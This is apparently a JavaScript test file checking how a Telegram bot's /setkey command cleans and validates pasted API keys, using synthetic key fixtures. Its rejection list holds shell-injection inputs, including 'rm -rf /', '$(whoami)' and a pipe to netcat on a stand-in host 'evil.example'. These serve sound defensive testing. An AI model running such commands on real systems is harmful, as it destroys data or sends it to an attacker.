// tests/api-key.test.mjs — /setkey must not rewrite a pasted API key (no network).
//
// Guards the bug that rejected two valid Google keys: the bot stripped every
// non-alphanumeric character, so a Google key's "." and "_" were dropped,
// Google answered "API key not valid", and the user was told it was a network
// problem.
//
// SECURITY: every fixture below is a synthetic EXAMPLE value. None uses a real
// vendor key prefix ("AIza…", "AQ.<base64>", "<digits>:<secret>"), so secret
// scanners cannot mistake a test fixture for a live credential — while the
// values still exercise the exact charset real keys use (dot, underscore,
// dash, and base64url padding ~ + / =). tests/no-secrets.test.mjs enforces
// this repo-wide.
import { pass, fail, ROOT } from './helpers.mjs';
import { join } from 'path';
import { pathToFileURL } from 'url';
import { readFileSync } from 'fs';

console.log('\nAPI key handling — lib/api-key.mjs');

try {
  const { cleanKey, isPlausibleApiKey } = await import(pathToFileURL(join(ROOT, 'lib', 'api-key.mjs')).href);

  // Synthetic key SHAPES (NOT real keys) for every provider /setkey accepts.
  const keys = {
    'AI Studio shape (dot + underscore + dash)': 'EXAMPLE.fake_ai-studio-key_not-real-000000000000',
    'Google legacy shape (dash + underscore)': 'EXAMPLE-fake_google-legacy-key_not-real-000000',
    'Hunter.io shape (hex length)': 'EXAMPLEfakehunterkeyEXAMPLEfake000000000',
    'SerpApi shape (hex length)': 'EXAMPLEfakeserpapikeyEXAMPLEfakeserpapikey00000000',
  };

  let intact = 0;
  for (const [label, key] of Object.entries(keys)) {
    const out = cleanKey(key);
    if (out === key && isPlausibleApiKey(out)) intact++;
    else fail(`${label}: key altered or rejected — "${key}" → "${out}" (accepted=${isPlausibleApiKey(out)})`);
  }
  if (intact === Object.keys(keys).length) pass(`all ${intact} provider key shapes survive verbatim`);

  // The specific character class the old sanitizer destroyed: dots, underscores,
  // dashes, and base64url padding (~ + / =) must all pass through unchanged.
  const dotted = 'EXAMPLE._~+/=fake-key_not-real-0123456789ABCDEF';
  if (cleanKey(dotted) === dotted && isPlausibleApiKey(dotted)) pass('dots, underscores, dashes and base64url padding preserved');
  else fail(`"${dotted}" → "${cleanKey(dotted)}"`);

  // Chat wrapping is stripped; the key itself is not.
  const bare = 'EXAMPLE.fake_key-not-real-000000000000';
  const wrapped = [[`  ${bare}  `, 'whitespace'],
    [`<${bare}>`, 'angle brackets (copied placeholder)'],
    [`"${bare}"`, 'double quotes'],
    ['`' + bare + '`', 'backticks (Markdown paste)']];
  let unwrapped = 0;
  for (const [raw, label] of wrapped) {
    if (cleanKey(raw) === bare) unwrapped++;
    else fail(`${label} not stripped: "${cleanKey(raw)}"`);
  }
  if (unwrapped === wrapped.length) pass('chat wrapping (quotes, brackets, backticks, spaces) stripped');

  // Rejections: too short, and anything a shell could reinterpret.
  const bad = ['short', '', 'EXAMPLE; rm -rf /', 'key with spaces here 12345678', 'EXAMPLE$(whoami)0123456789abc',
    'EXAMPLE`id`0123456789abcdef', 'EXAMPLE|nc evil.example 1234'];
  const leaked = bad.filter((b) => isPlausibleApiKey(cleanKey(b)));
  if (leaked.length === 0) pass('short keys and shell metacharacters rejected');
  else fail(`accepted unsafe input: ${JSON.stringify(leaked)}`);

  // --- wiring guard: the bot must not reintroduce the destructive strip -----
  const bot = readFileSync(join(ROOT, 'telegram-bot.mjs'), 'utf-8');
  if (!/replace\(\/\[\^A-Za-z0-9\]\/g/.test(bot)) pass('telegram-bot.mjs no longer strips non-alphanumerics from keys');
  else fail('telegram-bot.mjs still rewrites the key before validating it');

  if (/execFileAsync\(\s*process\.execPath,\s*\[[^\]]*set-key\.mjs/s.test(bot))
    pass('/setkey passes the key via execFile argv (no shell re-parsing)');
  else fail('/setkey should call set-key.mjs through execFile, not a shell string');

  // set-key.mjs must hand the real reason back to the bot.
  const setKey = readFileSync(join(ROOT, 'set-key.mjs'), 'utf-8');
  if (setKey.includes('KEY_ERROR')) pass('set-key.mjs emits KEY_ERROR with the provider\'s actual message');
  else fail('set-key.mjs swallows the rejection reason');
} catch (err) {
  fail(`api-key test crashed: ${err.message}`);
}
